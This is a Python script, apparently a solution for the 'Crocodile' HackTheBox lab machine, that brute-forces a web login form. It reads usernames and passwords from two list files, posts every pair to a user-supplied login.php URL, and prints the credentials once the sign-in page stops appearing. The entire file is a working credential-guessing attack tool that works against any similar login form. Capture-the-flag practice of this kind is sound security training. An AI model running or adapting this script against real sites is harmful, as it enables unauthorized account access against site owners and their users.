#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from time import sleep
from colorama import Fore, Style

url = input(Fore.GREEN + "[*] Enter URL { Format ---> http://IP/login.php } : ")
payload = {
    'Username' : '',
    'Password' : '',
    'Submit' : 'Login'
}

userFile = "allowed.userlist"
passFile = "allowed.userlist.passwd"

def bruteForce(url : str, payload : dict, usernameFile : str, passwordFile : str) -> None:
    '''
    Performs Brute Force Attack over the crocodile machine of HackTheBox.
    Returns None, if password found breaks the code execution.
    Scripted By : exploitslayer {RAHUL DIXIT}
    '''
    usernames = open(usernameFile, 'r').readlines()
    passwords = open(passwordFile, 'r').readlines()
    onLoginPage = "Please sign in"
    for username in usernames:
        user = username.strip('\n')
        for password in passwords:
            pass_ = password.strip('\n')
            payload['Username'] = user
            payload['Password'] = pass_
            response = requests.post(url, data = payload)
            if onLoginPage in response.text:
                print(Fore.RED + "[-] Login Failed")
            else:
                print(Fore.GREEN + "[+] Login SucessFull")
                sleep(0.5)
                print(Fore.GREEN + "[+] USERNAME : " + user)
                print(Fore.GREEN + "[+] PASSWORD : " + pass_)
                exit()


bruteForce(url, payload, userFile, passFile)
